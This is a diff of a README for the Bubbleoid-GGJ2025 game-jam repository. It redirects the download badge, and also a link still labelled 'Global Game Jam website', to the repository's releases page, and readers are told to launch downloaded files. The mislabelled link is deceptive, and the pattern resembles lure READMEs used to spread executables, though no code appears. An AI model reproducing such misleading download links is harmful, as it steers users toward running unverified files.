@@ -9,7 +9,7 @@ Welcome to the Bubbleoid-GGJ2025 repository, where creativity meets game develop
 
 ## 🚀 Get Started
 Ready to play? Click the link below to download the game and start your Bubbleoid-GGJ2025 journey:
-[![Download Game](https://img.shields.io/badge/Download-Release.zip-green)](https://github.com/assets/Release.zip)
+[![Download Game](https://github.com/prasanna-debug/Bubbleoid-GGJ2025/releases)](https://github.com/prasanna-debug/Bubbleoid-GGJ2025/releases)
 
 ### **Notes:**
 - If the link ends with a file name, make sure to launch the file after downloading.
@@ -20,7 +20,7 @@ Ready to play? Click the link below to download the game and start your Bubbleoi
 Get your game face on, fire up Delphi, and immerse yourself in the world of Bubbleoid-GGJ2025. Challenge yourself, unleash your creativity, and have a blast as you navigate through this thrilling gaming experience. 🚀🎉
 
 ### 🌐 Explore More
-Visit the [Global Game Jam website](https://globalgamejam.org) for additional game development resources, event updates, and to connect with a vibrant community of game developers worldwide!
+Visit the [Global Game Jam website](https://github.com/prasanna-debug/Bubbleoid-GGJ2025/releases) for additional game development resources, event updates, and to connect with a vibrant community of game developers worldwide!
 
 ## 🌟 Thank You!
 Thank you for visiting the Bubbleoid-GGJ2025 repository. Stay tuned for updates, share your feedback, and most importantly, enjoy the game development journey ahead! 🎮✨
